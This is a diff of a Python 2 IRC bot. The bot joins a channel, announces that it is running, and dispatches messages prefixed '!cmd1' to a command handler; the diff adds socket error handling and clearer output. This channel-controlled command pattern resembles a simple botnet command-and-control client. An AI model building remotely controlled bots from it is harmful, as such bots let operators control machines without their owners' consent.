@@ -34,7 +34,7 @@ def exec_cmd(s, argv):
     print '[+] ARGS = %s' % argv[1:]
 
 def parse_data(s, data):
-    print data
+    print 'Received data = {\n%s\n}' % data
     for m in re.finditer('!(cmd1[^\r\n]*)[\r\n]+', data):
         exec_cmd(s, m.group(1))
 
@@ -43,16 +43,25 @@ def main(server, port, channel, nick, use_ssl):
         s = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
     else:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((server, port))
+
+    try:
+        s.connect((server, port))
+    except Exception as e:
+        print 'Error (socket.connect):', e
+        sys.exit(1)
 
     # Print server info and motd
     print recv_timeout(s)
 
     # Set nick and connect to the channel
-    s.send('NICK %s\r\n' % nick)
-    s.send('USER %s %s %s %s\r\n' % (nick, nick, nick, nick))
-    s.send('JOIN %s\r\n' % channel)
-    s.send('PRIVMSG %s :[+] %s up and running!\r\n' % (channel, nick))
+    try:
+        s.send('NICK %s\r\n' % nick)
+        s.send('USER %s %s %s %s\r\n' % (nick, nick, nick, nick))
+        s.send('JOIN %s\r\n' % channel)
+        s.send('PRIVMSG %s :[+] %s up and running!\r\n' % (channel, nick))
+    except Exception as e:
+        print 'Error (socket.send):', e
+        sys.exit(1)
 
     # Wait for commands
     while True:
